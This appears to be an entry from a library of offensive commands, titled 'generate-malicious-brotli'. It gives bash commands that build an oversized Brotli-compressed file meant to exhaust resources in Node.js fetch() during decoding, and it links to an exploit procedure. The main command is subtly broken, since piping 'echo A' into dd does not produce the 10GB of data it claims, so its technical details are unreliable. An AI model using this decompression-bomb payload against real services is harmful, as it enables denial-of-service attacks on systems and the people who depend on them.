---
id: 123e4567-e89b-12d3-a456-426614174002
data: >-
  echo 'A' | dd if=/dev/stdin bs=1M count=10000 | brotli --best -o malicious.br
  -
name: generate-malicious-brotli
tags:
  - dos
  - payload-generation
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2024-10-04T00:00:00Z'
updated_at: '2025-12-14T17:26:48.710Z'
verified: false
validated: true
submitted: true
---
# generate-malicious-brotli

## Command

```bash
echo 'A' | dd if=/dev/stdin bs=1M count=10000 | brotli --best -o malicious.br -
```

## Description

Generates a maliciously large Brotli-compressed file by creating 10GB of repetitive data and compressing it at the highest level. This payload expands during decoding, exploiting Node.js fetch() resource exhaustion.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `count=10000` | Number of 1MB blocks to generate (adjust for size) | No |
| `--best` | Brotli compression quality (0-11, higher = smaller file) | No |
| `-o malicious.br` | Output filename | Yes |

## Examples

### Basic Usage

```bash
echo 'A' | dd if=/dev/stdin bs=1M count=1000 | brotli -o test.br -
```

### Advanced Usage

```bash
# Larger payload
head -c 100000000 /dev/zero | brotli --best -o huge.br -
```

## Expected Output

Compressed file malicious.br created (e.g., 10-50MB size). No stdout; check file existence with ls -lh malicious.br.

## Related

- [[Related Procedure|procedures/Exploit-Brotli-Decoding-DoS-in-Node-js]]
